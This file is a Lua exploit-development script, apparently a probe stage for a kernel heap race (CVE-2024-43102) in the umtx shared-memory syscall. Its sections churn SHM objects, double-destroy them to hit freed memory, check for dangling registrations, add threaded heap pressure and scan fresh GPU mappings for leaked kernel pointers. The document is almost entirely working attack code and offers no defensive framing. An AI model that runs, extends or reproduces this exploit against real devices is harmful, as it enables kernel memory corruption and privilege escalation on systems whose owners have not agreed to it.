-- CRASH_CLASS: MODERATE
-- PROBE 152a: UMTX SHM heap reclaim via threads + GPU mmap
--
-- Context: 151a confirmed UMTX_OP_SHM (op=25) on syscall 454 is fully
-- reachable. CVE-2024-43102 is a race in umtx_shm_create_reg/unref_reg.
-- 151b-151e crashed from resource exhaustion (too many allocs/pipes).
--
-- Strategy:
--   1. GPU mmap baseline scan (before SHM activity)
--   2. Rapid SHM create/destroy from main thread (200 cycles, single key buffer)
--   3. GPU mmap #2 after SHM churn to reclaim freed slabs
--   4. Scan both GPU regions for kernel pointer contamination
--   5. Use Thrd_create + Atomic_fetch_add to add heap pressure
--
-- Safety: reuse ONE key buffer, no fstat(551), no pipes, minimal allocs

print("=== PROBE 152a: SHM HEAP RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

local sc_umtx = make_syscall(454)
local sc_mmap = make_syscall(477)

-- Single reusable key buffer for all SHM ops
local key = memory.alloc(0x20)

print("")
print("--- SECTION A: GPU MMAP BASELINE ---")

-- GPU mmap #1: 8 pages = 128KB
local gpu1 = sc_mmap(uint64(0), uint64(8 * 0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local g1h, g1l = get_hi_lo(gpu1)
print(string.format("gpu1=0x%X%08X", g1h, g1l))

-- Scan gpu1 baseline
local kptr_base = 0
local nz_base = 0
for off = 0, 8 * 0x4000 - 8, 8 do
    local ok, val = pcall(function() return memory.read_qword(gpu1 + off) end)
    if ok and val then
        local vh, vl = get_hi_lo(val)
        if vh ~= 0 or vl ~= 0 then nz_base = nz_base + 1 end
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
            kptr_base = kptr_base + 1
        end
    end
end
print("gpu1_nonzero=" .. nz_base .. " kptr=" .. kptr_base)

print("")
print("--- SECTION B: SHM CHURN (200 CYCLES) ---")

-- Rapid create/destroy cycles using a single key buffer
-- Each cycle: create SHM object (kernel alloc) then destroy (kernel free)
local create_ok = 0
local destroy_ok = 0
local create_fail = 0
local destroy_fail = 0

for i = 1, 200 do
    memory.write_qword(key, uint64(0xBB000000 + i))

    local ok1, r1 = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)
    if ok1 and to_num(r1) == 0 then create_ok = create_ok + 1
    else create_fail = create_fail + 1 end

    local ok2, r2 = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
    if ok2 and to_num(r2) == 0 then destroy_ok = destroy_ok + 1
    else destroy_fail = destroy_fail + 1 end
end
print(string.format("create: ok=%d fail=%d", create_ok, create_fail))
print(string.format("destroy: ok=%d fail=%d", destroy_ok, destroy_fail))

print("")
print("--- SECTION C: GPU MMAP #2 (RECLAIM) ---")

-- New GPU mmap after SHM churn - may reclaim freed kernel slabs
local gpu2 = sc_mmap(uint64(0), uint64(8 * 0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local g2h, g2l = get_hi_lo(gpu2)
print(string.format("gpu2=0x%X%08X", g2h, g2l))

-- Scan gpu2 for kernel pointers
local kptr_after = 0
local nz_after = 0
local ksamples = {}
for off = 0, 8 * 0x4000 - 8, 8 do
    local ok, val = pcall(function() return memory.read_qword(gpu2 + off) end)
    if ok and val then
        local vh, vl = get_hi_lo(val)
        if vh ~= 0 or vl ~= 0 then nz_after = nz_after + 1 end
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
            kptr_after = kptr_after + 1
            if #ksamples < 10 then
                ksamples[#ksamples + 1] = string.format("+0x%X: 0x%08X%08X", off, vh, vl)
            end
        end
    end
end
print("gpu2_nonzero=" .. nz_after .. " kptr=" .. kptr_after)
for _, s in ipairs(ksamples) do print(s) end

-- Also rescan gpu1 for contamination
local kptr_rescan = 0
for off = 0, 8 * 0x4000 - 8, 8 do
    local ok, val = pcall(function() return memory.read_qword(gpu1 + off) end)
    if ok and val then
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
            kptr_rescan = kptr_rescan + 1
            if kptr_rescan <= 5 then
                print(string.format("GPU1_RESCAN +0x%X: 0x%08X%08X", off, vh, vl))
            end
        end
    end
end
print("gpu1_rescan_kptr=" .. kptr_rescan)

print("")
print("--- SECTION D: SHM DANGLING + ALIVE CHECK ---")

-- Create SHM objects, destroy them, then check ALIVE (use-after-free indicator)
-- If ALIVE returns 0 on a destroyed key, the registration might still be live
local dangling = 0
for i = 1, 20 do
    memory.write_qword(key, uint64(0xCC000000 + i))
    pcall(function() sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0)) end)
    pcall(function() sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0)) end)

    -- Check ALIVE after destroy
    local ok, ret = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(8), uint64(0), uint64(0))
    end)
    local rv = ok and to_num(ret) or -999
    if rv == 0 then
        dangling = dangling + 1
        if dangling <= 5 then
            print(string.format("DANGLING key=0xCC%06X alive_after_destroy=0", i))
        end
    end
end
print("dangling_count=" .. dangling)

print("")
print("--- SECTION E: DOUBLE DESTROY ---")

-- Double-destroy: part of the CVE-2024-43102 pattern
-- Create one SHM, destroy it twice - second destroy hits freed memory
local dd_results = {}
for i = 1, 10 do
    memory.write_qword(key, uint64(0xDD000000 + i))

    pcall(function() sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0)) end)

    local ok1, r1 = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
    local ok2, r2 = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)

    local rv1 = ok1 and to_num(r1) or -999
    local rv2 = ok2 and to_num(r2) or -999
    dd_results[#dd_results + 1] = string.format("dd[%d]: d1=%d d2=%d", i, rv1, rv2)
end
for _, s in ipairs(dd_results) do print(s) end

print("")
print("--- SECTION F: THREADED HEAP PRESSURE ---")

-- Use Thrd_create to add heap pressure while doing SHM ops
-- Thread entry: Atomic_fetch_add_8 at a shared counter
-- This creates/destroys threads rapidly to churn kernel thread stacks
local shared = memory.alloc(0x10)
memory.write_qword(shared, uint64(0))

local Thrd_create_addr = nil
local Atomic_fetch_add_addr = nil
local Thrd_join_addr = nil

-- Get addresses from libc_addrofs
if libc_addrofs then
    local la = libc_addrofs
    if la then
        Thrd_create_addr = la.Thrd_create
        Atomic_fetch_add_addr = la.Atomic_fetch_add_8
        Thrd_join_addr = la.Thrd_join
    end
end

if Thrd_create_addr then
    print("Thrd_create=" .. tostring(Thrd_create_addr))
    print("Atomic_fetch_add=" .. tostring(Atomic_fetch_add_addr))

    -- Create 3 threads, each increments shared counter
    -- While threads run, do SHM create/destroy
    local tids = {}
    for i = 1, 3 do
        local ok, ret = pcall(function()
            return native.fcall_with_rax(Thrd_create_addr, shared, Atomic_fetch_add_addr, shared)
        end)
        if ok then
            tids[#tids + 1] = ret
            print("thread " .. i .. ": tid=" .. tostring(ret))
        end
    end

    -- SHM churn while threads are running
    local race_ok = 0
    for i = 1, 50 do
        memory.write_qword(key, uint64(0xEE000000 + i))
        pcall(function() sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0)) end)
        pcall(function() sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0)) end)
        race_ok = race_ok + 1
    end
    print("race_shm_cycles=" .. race_ok)

    -- Join threads
    for _, tid in ipairs(tids) do
        pcall(function() native.fcall_with_rax(Thrd_join_addr, tid, uint64(0)) end)
    end
    print("threads joined")

    -- Check shared counter
    local counter_val = memory.read_qword(shared)
    print("shared_counter=" .. tostring(counter_val))
else
    print("SKIP: native.addrofs not available")

    -- Fallback: just do more SHM churn without threads
    for i = 1, 100 do
        memory.write_qword(key, uint64(0xEE000000 + i))
        pcall(function() sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0)) end)
        pcall(function() sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0)) end)
    end
    print("fallback churn done")
end

print("")
print("--- SECTION G: FINAL GPU SCAN ---")

-- One more GPU mmap after thread+SHM activity
local gpu3 = sc_mmap(uint64(0), uint64(8 * 0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local g3h, g3l = get_hi_lo(gpu3)
print(string.format("gpu3=0x%X%08X", g3h, g3l))

local kptr_final = 0
local final_samples = {}
for off = 0, 8 * 0x4000 - 8, 8 do
    local ok, val = pcall(function() return memory.read_qword(gpu3 + off) end)
    if ok and val then
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl ~= 0 then
            kptr_final = kptr_final + 1
            if #final_samples < 10 then
                final_samples[#final_samples + 1] = string.format("+0x%X: 0x%08X%08X", off, vh, vl)
            end
        end
    end
end
print("gpu3_kptr=" .. kptr_final)
for _, s in ipairs(final_samples) do print(s) end

-- Canary
local cpid = to_num(syscall.getpid())
print("")
print("canary=" .. cpid)
print("=== PROBE 152a COMPLETE ===")
